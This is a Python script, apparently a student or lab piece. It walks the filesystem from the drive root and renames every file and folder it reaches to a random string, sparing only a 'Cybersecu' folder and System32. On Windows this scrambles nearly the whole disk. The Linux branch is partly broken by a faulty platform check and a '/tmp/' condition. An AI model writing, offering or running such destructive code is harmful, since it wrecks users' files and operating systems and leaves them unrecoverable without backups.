import os, string, random
from random import randint
from sys import platform

chars = string.ascii_uppercase + string.digits + string.ascii_lowercase

if platform == "linux" or platform == "linux2":
    path = "/"
else:
    path = "C:\\"


def changename(oldfilename, p):
    weirdname = ''.join(random.choice(chars) for _ in range(randint(1, 30)))
    newfilename = "%s%s"%(p, weirdname)
    os.rename(oldfilename, newfilename)

    return newfilename


def renameall(p):
    if platform == "linux" or platform == "linux2:":
        for i in os.listdir(p):
            if p == "/tmp/" and i != "Cybersecu":
                filename = "%s%s"%(p, i)
                if os.path.isdir(filename):
                    filename = changename(filename, p)

                    filename = "%s/"%(filename)
                    print(f"new file name : {filename}")
                    renameall(filename)
                else:
                    changename(filename, p)
    elif platform == "win32":
        for i in os.listdir(p):
            if (p == "C:\\" and i != "Cybersecu") or (p == "C:\Windows\\" and i != "System32") or (
                    p != "C:\\" and p != "C:\Windows\\"):
                filename = "%s%s" % (p, i)
                if os.path.isdir(filename):
                    if filename != "C:\Windows":
                        filename = changename(filename, p)

                        filename = "%s\\" % (filename)
                        print(f"new file name : {filename}")
                        renameall(filename)
                    else:
                        filename = "%s\\" % (filename)
                        renameall(filename)
                else:
                    changename(filename, p)


renameall(path)
